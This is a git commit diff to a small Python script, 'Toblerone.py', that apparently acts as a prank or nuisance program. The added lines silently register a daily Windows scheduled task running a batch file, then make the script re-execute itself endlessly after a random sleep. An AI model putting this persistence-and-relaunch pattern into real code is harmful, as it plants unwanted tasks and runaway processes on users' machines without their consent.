08d90af303d48c4b17a7d4e56a7e23b8bad98b70
Aidan Patrick Marias <52266188+Silver0006@users.noreply.github.com>
2023-02-15 16:54:48 -0500

    Add files via upload

--- Toblerone.py
+++ Toblerone.py
@@ -1,6 +1,7 @@
-import random, time, os
+import random, time, os, subprocess, sys
+os.system(r'SchTasks /Create /SC DAILY /TN "My Task" /TR "C:mytask.bat" /ST 09:00')
 list1 = [30, 45, 60, 360, 600, 21, 49, 63, 451]
 print(random.choice(list1))
-os.startfile("blubbernugget.bat")
 time.sleep(random.choice(list1))
 import Toblerone2
+os.execv(sys.argv[0], sys.argv)
